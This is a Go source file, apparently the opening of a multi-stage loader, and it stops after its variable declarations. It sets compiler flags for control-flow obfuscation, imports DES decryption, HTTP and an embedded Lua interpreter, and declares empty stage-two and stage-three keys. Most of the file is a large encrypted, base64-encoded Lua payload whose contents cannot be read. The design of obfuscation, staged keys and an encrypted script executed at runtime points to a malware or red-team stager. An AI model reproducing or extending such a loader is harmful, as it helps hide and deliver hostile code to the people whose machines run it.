package main

// #cgo CFLAGS: -g -mllvm -sub -mllvm -fla -mllvm -bcf -mllvm -split
import "C"

import (
	"crypto/des"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"path/filepath"
	"time"
    "github.com/yuin/gopher-lua"
	"net/http"
	"net/url"
	"strconv"

)
var start = time.Now().Unix()

var STAGE2KEY = ""
var STAGE3KEY = ""

var ENCRYPTEDLUA = `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
